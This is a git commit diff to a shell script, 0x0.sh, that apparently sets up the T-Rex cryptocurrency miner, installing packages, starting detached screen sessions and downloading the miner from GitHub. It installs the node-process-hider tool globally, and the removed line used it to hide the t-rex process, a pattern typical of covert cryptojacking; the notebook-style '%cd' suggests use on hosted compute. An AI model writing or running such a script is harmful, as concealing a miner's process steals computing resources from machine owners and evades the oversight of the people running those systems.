d0d4662c97da4454ac1bbc26923ea2a0483340f2
ayangkuning <103827356+ayangkuning@users.noreply.github.com>
2022-04-17 13:00:00 +0700

    Update and rename 0x.sh to 0x0.sh

--- 0x0.sh
+++ 0x0.sh
@@ -2,7 +2,7 @@ sudo apt update
 sudo apt install screen -y
 screen -dmS ip.sh 89 95
 %cd /opt
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add t-rex
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider
 sudo apt install libpci3
 sudo apt-get install screen
 wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz -O - | tar -xz
